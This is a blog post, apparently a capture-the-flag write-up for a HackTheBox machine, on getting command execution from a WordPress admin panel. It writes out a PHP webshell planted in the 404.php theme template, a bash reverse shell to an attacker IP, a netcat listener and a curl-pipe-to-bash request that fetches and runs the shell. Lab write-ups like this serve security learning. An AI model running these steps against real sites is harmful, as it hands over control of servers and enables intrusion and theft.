---
layout: post
categories: [Abusing CMSs]
---

# Introduction

- CTF: **"Enterprise"** on HackTheBox

- This post is the third part of the list **"Abusing CMS"**.

Today I'm going to explain the most common way to gain Remote Command Execution with a shell once you have access to the admin panel in a wordpress site.

# Exploitation

This "technique" always work in all wordpress versions if there isn't any extra security layer because it's a feature not a bug.

To access the panel, you can test common credentials or trying some exploits for the right version, if you already don't know how to enumerate the version I encourage you to learn about wordpress, its structure and normal working.

However you can do that with tools like **"wpscan"**, **"wpseku"**, **"WhatWeb"** or **"Wappalyzer"**

Once you've accessed to the panel as admin, you will see something like this:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-dashboard.png"> 

Now, you have to click on **"Editor"*** --> **"Themes"** --> ***"404.php"**.

And you will see something like that:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-editor.png">

Just add your malicious code in the template, in my case it's simple webshell.

```php
system($_REQUEST['cmd']);
```
And click on **"Update file"**.

Go to the edited template (or wherever you've injected your webshell) in my case I go to ***http://10.10.10.61/?p=404.php&cmd=whoami***

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-rce.png">

You'll see the executed command.

If you don't see the output you can ping your IP to check the command execution. If you've received the ICMP requests it means that the "victim" is up and has direct communication with you.

If at this point all works properly, start a netcat listener in your attacker machine.

```sh
nc -nlvp 443
```

My reverse shell will be in a file called index.html in my machine, wich contains a simple bash reverse shell:

```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.6/443 0>&1
```

Now I start a http server with python3 like this:

```sh
python3 -m http.server 80
```

And if you send a request to your ip with ***curl*** and you add a pipe and "bash", it executes the index.html with bash, and the content of the file is a reverse shell.

So send a request to: 
```
http://10.10.10.61/?p=404.php&cmd=curl 10.10.16.6 | bash
```

(You need to change the ip of the "curl" and the ip of the reverse shell.)

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-rce2.png">

As I send the request to the webpage, I check the listener and... Voilà.
The victim sent a request to my server index.html and executed it with bash.

I successfully received the shell and I'm actually on the victim machine.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-shell.png">

# References

```
https://wpscan.com/wordpress-security-scanner
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
https://www.getastra.com/blog/security-audit/wordpress-penetration-testing/
```

# Conclusion

I hope you've learned how to leverage the internal Wordpress admin panel to execute commands

[Go back to top](#)


